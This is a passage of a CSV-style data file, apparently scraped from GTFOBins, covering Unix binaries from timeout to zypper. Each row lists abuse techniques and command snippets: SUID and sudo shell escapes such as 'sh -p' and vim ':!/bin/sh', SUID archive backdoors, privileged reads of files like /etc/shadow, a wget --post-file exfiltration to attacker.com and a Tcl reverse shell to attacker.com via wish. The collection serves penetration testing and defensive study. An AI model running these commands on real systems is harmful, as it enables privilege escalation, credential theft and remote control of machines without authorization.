+timeout,https://gtfobins.github.io/gtfobins/timeout/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,timeout 7d /bin/sh; sh -p; -p
+tmate,https://gtfobins.github.io/gtfobins/tmate/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,tmate -c /bin/sh; sudo; sudo tmate -c /bin/sh
+tmux,https://gtfobins.github.io/gtfobins/tmux/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"tmux; tmux -S /path/to/socket_name; LFILE=file_to_read
+tmux -f $LFILE"
+top,https://gtfobins.github.io/gtfobins/top/,"This requires that an existing configuration file is present, to create one run top then type Wq. Note down the actual configuration file path and use it in the below examples.",Shell; Sudo,"top; Wq; echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
+top
+# press return twice
+reset"
+torify,https://gtfobins.github.io/gtfobins/torify/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,torify /bin/sh; sudo; sudo torify /bin/sh
+torsocks,https://gtfobins.github.io/gtfobins/torsocks/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,torsocks /bin/sh; sudo; sudo torsocks /bin/sh
+troff,https://gtfobins.github.io/gtfobins/troff/,"The file is typeset but text is still readable in the output, alternatively the output can be read with man -l.",File read; SUID; Sudo,"man -l; LFILE=file_to_read
+troff $LFILE; sh -p"
+tshark,https://gtfobins.github.io/gtfobins/tshark/,This program is able to execute lua code.,Shell,"lua; TF=$(mktemp)
+echo 'os.execute(""/bin/sh"")' >$TF
+tshark -Xlua_script:$TF"
+ul,https://gtfobins.github.io/gtfobins/ul/,The read file content is corrupted by replacing occurrences of $'\b_' to terminal sequences and by converting tabs to spaces.,File read; SUID; Sudo,"$'\b_'; LFILE=file_to_read
+ul ""$LFILE""; sh -p"
+unexpand,https://gtfobins.github.io/gtfobins/unexpand/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+unexpand -t99999999 ""$LFILE""; sh -p; -p"
+uniq,https://gtfobins.github.io/gtfobins/uniq/,The read file content is corrupted by squashing multiple adjacent lines.,File read; SUID; Sudo,"LFILE=file_to_read
+uniq ""$LFILE""; sh -p; -p"
+unshare,https://gtfobins.github.io/gtfobins/unshare/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,unshare /bin/sh; sh -p; -p
+unsquashfs,https://gtfobins.github.io/gtfobins/unsquashfs/,unsquashfs preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:,SUID; Sudo,"unsquashfs; cp /bin/sh .
+chmod +s sh
+mksquashfs sh shell; -p"
+unzip,https://gtfobins.github.io/gtfobins/unzip/,Certain unzip versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:,SUID; Sudo,"unzip; cp /bin/sh .
+chmod +s sh
+zip shell.zip sh; -p"
+update-alternatives,https://gtfobins.github.io/gtfobins/update-alternatives/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
+uudecode,https://gtfobins.github.io/gtfobins/uudecode/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+uuencode ""$LFILE"" /dev/stdout | uudecode; sh -p; -p"
+uuencode,https://gtfobins.github.io/gtfobins/uuencode/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+uuencode ""$LFILE"" /dev/stdout | uudecode; sh -p; -p"
+vagrant,https://gtfobins.github.io/gtfobins/vagrant/,"This allows to execute ruby code, other functions may apply.",Shell; SUID; Sudo,"ruby; cd $(mktemp -d)
+echo 'exec ""/bin/sh""' > Vagrantfile
+vagrant up; sh -p"
+valgrind,https://gtfobins.github.io/gtfobins/valgrind/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,valgrind /bin/sh; sudo; sudo valgrind /bin/sh
+varnishncsa,https://gtfobins.github.io/gtfobins/varnishncsa/,"This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start varnishncsa as follows, then trigger the file write with:",SUID; Sudo,varnishncsa; curl -H 'yyy: DATA' http://localhost:6081/xxx; sh -p
+vi,https://gtfobins.github.io/gtfobins/vi/,Modern Unix systems run vim binary when vi is called.,Shell; File write; File read; Sudo,vim; vi; vi -c ':!/bin/sh' /dev/null
+view,https://gtfobins.github.io/gtfobins/view/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"view -c ':!/bin/sh'; view
+:set shell=/bin/sh
+:shell; view"
+vigr,https://gtfobins.github.io/gtfobins/vigr/,"This command allows to edit some designated files (/etc/passwd, /etc/group, /etc/shadow and /etc/gshadow) safely by spawning the default editor (falling back to vim, other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with sudo.",SUID; Sudo,/etc/passwd; /etc/group; /etc/shadow
+vim,https://gtfobins.github.io/gtfobins/vim/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,vim -c ':!/bin/sh'; vim --cmd ':set shell=/bin/sh|:shell'; vim
+vimdiff,https://gtfobins.github.io/gtfobins/vimdiff/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"vimdiff -c ':!/bin/sh'; vimdiff
+:set shell=/bin/sh
+:shell; vimdiff"
+vipw,https://gtfobins.github.io/gtfobins/vipw/,"This command allows to edit some designated files (/etc/passwd, /etc/group, /etc/shadow and /etc/gshadow) safely by spawning the default editor (falling back to vim, other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with sudo.",SUID; Sudo,/etc/passwd; /etc/group; /etc/shadow
+virsh,https://gtfobins.github.io/gtfobins/virsh/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; Sudo,libvirt; pool-create-as; --build
+volatility,https://gtfobins.github.io/gtfobins/volatility/,"This command requires some valid coredump file which, if not available, can be uploaded to the target. The volshell command spawns a python shell, other functions may apply.",Shell,"volshell; python; volatility -f file.dump volshell
+__import__('os').system('/bin/sh')"
+w3m,https://gtfobins.github.io/gtfobins/w3m/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+w3m ""$LFILE"" -dump; sh -p; -p"
+wall,https://gtfobins.github.io/gtfobins/wall/,The textual file is dumped on the current TTY (neither to stdout nor to stderr).,Sudo,stdout; stderr; sudo
+watch,https://gtfobins.github.io/gtfobins/watch/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo; Limited SUID,watch -x sh -c 'reset; exec sh 1>&0 2>&0'; sh -p; -p
+wc,https://gtfobins.github.io/gtfobins/wc/,"The file content is parsed as a sequence of \x00 separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.",File read; SUID; Sudo,"\x00; LFILE=file_to_read
+wc --files0-from ""$LFILE""; sh -p"
+wget,https://gtfobins.github.io/gtfobins/wget/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; File write; File read; SUID; Sudo,"TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+wget --use-askpass=$TF 0; --post-data; URL=http://attacker.com/
+LFILE=file_to_send
+wget --post-file=$LFILE $URL"
+whiptail,https://gtfobins.github.io/gtfobins/whiptail/,"The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.",File read; SUID; Sudo,"LFILE=file_to_read
+whiptail --textbox --scrolltext ""$LFILE"" 0 0; sh -p; -p"
+whois,https://gtfobins.github.io/gtfobins/whois/,whois hangs waiting for the remote peer to close the socket.,File upload; File download,"whois; nc -l -p 12345 > ""file_to_save""; $'\x0d\x0a'"
+wireshark,https://gtfobins.github.io/gtfobins/wireshark/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; Sudo,lua; wireshark; sudo
+wish,https://gtfobins.github.io/gtfobins/wish/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Sudo,"wish
+exec /bin/sh <@stdin >@stdout 2>@stderr; nc -l -p 12345; export RHOST=attacker.com
+export RPORT=12345
+echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
+xargs,https://gtfobins.github.io/gtfobins/xargs/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,xargs -a /dev/null sh; echo x | xargs -Iy sh -c 'exec sh 0<&1'; stdin
+xdg-user-dir,https://gtfobins.github.io/gtfobins/xdg-user-dir/,"The current implementation of xdg-user-dir is basically eval echo \${XDG_${1}_DIR:-$HOME}, thus is can be easily used to achieve command execution.",Shell; Sudo,xdg-user-dir; eval echo \${XDG_${1}_DIR:-$HOME}; xdg-user-dir '}; /bin/sh #'
+xdotool,https://gtfobins.github.io/gtfobins/xdotool/,This requires a running X server.,Shell; SUID; Sudo,xdotool exec --sync /bin/sh; sh -p; -p
+xelatex,https://gtfobins.github.io/gtfobins/xelatex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'; xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
+strings article.dvi; sudo"
+xetex,https://gtfobins.github.io/gtfobins/xetex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,xetex --shell-escape '\write18{/bin/sh}\end'; sudo; sudo xetex --shell-escape '\write18{/bin/sh}\end'
+xmodmap,https://gtfobins.github.io/gtfobins/xmodmap/,The read file content is corrupted by error prints.,File read; SUID; Sudo,"LFILE=file_to_read
+xmodmap -v $LFILE; sh -p; -p"
+xmore,https://gtfobins.github.io/gtfobins/xmore/,"The file is displayed in a Xorg window, so it needs a working graphical environment.",File read; SUID; Sudo,"LFILE=file_to_read
+xmore $LFILE; sh -p; -p"
+xpad,https://gtfobins.github.io/gtfobins/xpad/,This is a GUI application. The file content is displayed in a sticky note.,File read; Sudo,"LFILE=file_to_read
+xpad -f ""$LFILE""; sudo; LFILE=file_to_read
+sudo xpad -f ""$LFILE"""
+xxd,https://gtfobins.github.io/gtfobins/xxd/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
+echo DATA | xxd | xxd -r - ""$LFILE""; LFILE=file_to_read
+xxd ""$LFILE"" | xxd -r; sh -p"
+xz,https://gtfobins.github.io/gtfobins/xz/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
+xz -c ""$LFILE"" | xz -d; sh -p; -p"
+yarn,https://gtfobins.github.io/gtfobins/yarn/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,yarn exec /bin/sh; preinstall; yarn --cwd $TF run preinstall
+yash,https://gtfobins.github.io/gtfobins/yash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,yash; sh -p; -p
+yelp,https://gtfobins.github.io/gtfobins/yelp/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read,"LFILE=file_to_read
+yelp ""man:$LFILE"""
+yum,https://gtfobins.github.io/gtfobins/yum/,It can download remote files.,File download; Sudo,.rpm; /var/tmp; /var/tmp/yum-root-cR0O4h/
+zathura,https://gtfobins.github.io/gtfobins/zathura/,"The interaction happens in a GUI window, while the shell is dropped in the terminal.",Shell; Sudo,"zathura
+:! /bin/sh -c 'exec /bin/sh 0<&1'; sudo; sudo zathura
+:! /bin/sh -c 'exec /bin/sh 0<&1'"
+zip,https://gtfobins.github.io/gtfobins/zip/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"TF=$(mktemp -u)
+zip $TF /etc/hosts -T -TT 'sh #'
+rm $TF; LFILE=file-to-read
+TF=$(mktemp -u)
+zip $TF $LFILE
+unzip -p $TF; sudo"
+zsh,https://gtfobins.github.io/gtfobins/zsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"zsh; export LFILE=file_to_write
+zsh -c 'echo DATA >$LFILE'; export LFILE=file_to_read
+zsh -c 'echo ""$(<$LFILE)""'"
+zsoelim,https://gtfobins.github.io/gtfobins/zsoelim/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",File read; SUID; Sudo,"LFILE=file_to_read
+zsoelim ""$LFILE""; sh -p; -p"
+zypper,https://gtfobins.github.io/gtfobins/zypper/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,/bin/sh; /usr/lib/zypper/commands/zypper-x; zypper x
